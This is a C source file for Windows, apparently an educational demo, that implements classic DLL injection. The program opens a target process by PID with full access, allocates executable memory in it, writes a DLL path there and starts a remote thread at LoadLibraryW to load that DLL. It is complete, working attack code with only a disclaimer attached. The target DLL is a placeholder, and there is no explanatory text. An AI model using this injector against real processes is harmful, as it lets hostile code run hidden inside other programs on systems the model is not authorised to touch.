/*
>* DLL Injection *<

@author:  bekoo 
@website: 0xbekoo.github.io
@warning: This project has been developed for educational purposes only. Its use in real scenarios is at one's own risk. 

*/

#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Usage: .\\program.exe <PID>");
        return -1;
    }
    DWORD       PID                 = atoi(argv[1]);
    HANDLE      HandleProcess       = NULL;
    HANDLE      HandleThread        = NULL;
    LPVOID      RemoteBuffer        = NULL;
    HMODULE     Kernel32            = NULL;
    wchar_t     DllPath[MAX_PATH]   = L"C:\\path\\to\\dll";

    Kernel32 = GetModuleHandleA("kernel32");
    if (Kernel32 == NULL) {
        printf("Failed to get a handle to kernel32.dll! Error Code: 0x%lx\n", GetLastError());
        return -1;
    }

    LPTHREAD_START_ROUTINE wLoadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(Kernel32, "LoadLibraryW");
    if (wLoadLibrary == NULL) {
        printf("Failed to get a address for LoadLibraryW! Error Code: 0x%lx", GetLastError());
        return -1;
    }

    HandleProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
    if (HandleProcess == NULL) {
        printf("Failed to Open Target Process! Error Code: 0x%lx", GetLastError());
        return -1;
    }

    RemoteBuffer = VirtualAllocEx(HandleProcess, NULL, sizeof(DllPath), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    if (RemoteBuffer == NULL) {
        printf("Failed to Allocated Memory for DLL! Error Code: 0x%lx", GetLastError());
        CloseHandle(HandleProcess);
        return -1;
    }

    if (!(WriteProcessMemory(HandleProcess, RemoteBuffer, DllPath, sizeof(DllPath), 0))) {
        printf("Failed to write dllPath to Allocated Memory Error Code: 0x%lx", GetLastError());
        CloseHandle(HandleProcess);
        return -1;
    }

    HandleThread = CreateRemoteThread(HandleProcess, NULL, 0, (LPTHREAD_START_ROUTINE)wLoadLibrary, RemoteBuffer, 0, 0);
    if (HandleThread == NULL) {
        printf("Failed to Create Thread! Error Code: 0x%lx\n", GetLastError());
        CloseHandle(HandleProcess);
        return -1;
    }
    WaitForSingleObject(HandleThread, INFINITE);
    CloseHandle(HandleThread);
    CloseHandle(HandleProcess);

    return 0;
}